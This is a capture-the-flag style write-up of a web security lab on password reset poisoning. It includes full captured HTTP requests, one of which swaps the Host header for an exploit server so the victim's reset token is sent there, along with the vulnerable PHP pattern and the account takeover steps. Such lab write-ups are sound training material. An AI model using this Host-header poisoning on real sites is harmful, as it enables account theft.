# Basic password reset poisoning

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

---

## 1. Detection

- Accessed the lab and logged in with the given credentials (`wiener:peter`).
- Logged out immediately, since the goal was to log into Carlos's account, not stay in my own.
- Visited `/forgot-password` and submitted a password reset request for my own account (`wiener`), capturing the request in the browser/proxy:

```http
POST /forgot-password HTTP/2
Host: 0a01004303246290801c1777002b0019.web-security-academy.net
Cookie: _lab=46%7cMCwCFA%2ffEU7FA1C7h2mQpf15YVTLb8U0AhRSxoStHsaR%2bfxFKR8Bq64ohIabquBnnO%2b9tMXWoJ43fSQSxbTXL85kYhqGqD1xA01CZYCqsJdkS83GlPcIeWbxFWh3EJ1n2%2bq2%2flh6AgVsewcF1AJX7YoRNTIn6n8xytA31KnLCyvDZak%3d; session=FPpAA4eB3m4ln50JoxDcVeetTdBJSSXL
Content-Length: 53
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: https://0a01004303246290801c1777002b0019.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a01004303246290801c1777002b0019.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

csrf=fXXk6jhDliGiMoTiv5pNMMzkS2r2KQys&username=wiener
```

- Since this is a "simple case" lab, the goal was to poison the reset flow so that Carlos's reset link gets generated pointing at an attacker-controlled domain — meaning the backend is likely building the reset link's base URL from the `Host` header rather than a hardcoded or whitelisted domain, something like:

```php
$domain = $_SERVER['HTTP_HOST'];
```

with no sanitization or whitelist check on that value.

---

## 2. Poisoning the Reset Request

- Modified the captured request: changed the `Host` header to point at the exploit server, and changed `username` to `carlos`:

```http
POST /forgot-password HTTP/2
Host: exploit-0a41005903f762c580f216bc016700cc.exploit-server.net
Cookie: _lab=46%7cMCwCFA%2ffEU7FA1C7h2mQpf15YVTLb8U0AhRSxoStHsaR%2bfxFKR8Bq64ohIabquBnnO%2b9tMXWoJ43fSQSxbTXL85kYhqGqD1xA01CZYCqsJdkS83GlPcIeWbxFWh3EJ1n2%2bq2%2flh6AgVsewcF1AJX7YoRNTIn6n8xytA31KnLCyvDZak%3d; session=FPpAA4eB3m4ln50JoxDcVeetTdBJSSXL
Content-Length: 53
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: https://0a01004303246290801c1777002b0019.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a01004303246290801c1777002b0019.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

csrf=fXXk6jhDliGiMoTiv5pNMMzkS2r2KQys&username=carlos
```

> **Why this works:** The application generates the password reset link by reading the `Host` header instead of using a fixed, trusted domain. Since the request still triggers a valid reset email for `carlos` (the `username` parameter controls *whose* token gets generated, independently of the `Host` header), the server emails Carlos a reset link built using the attacker-supplied host — `exploit-0a41005903f762c580f216bc016700cc.exploit-server.net` — instead of the real lab domain. When Carlos clicks the link, his browser sends the valid reset token straight to the attacker's exploit server.

---

## 3. Solve the Challenge

- Checked the exploit server's access log and found the incoming request containing Carlos's password reset token (sent automatically when the lab's simulated "Carlos" clicked the poisoned link in his email).
- Took the leaked token and used it in place of my own on the password reset page, resetting Carlos's password.
- Logged in as `carlos` with the new password.
- Lab solved.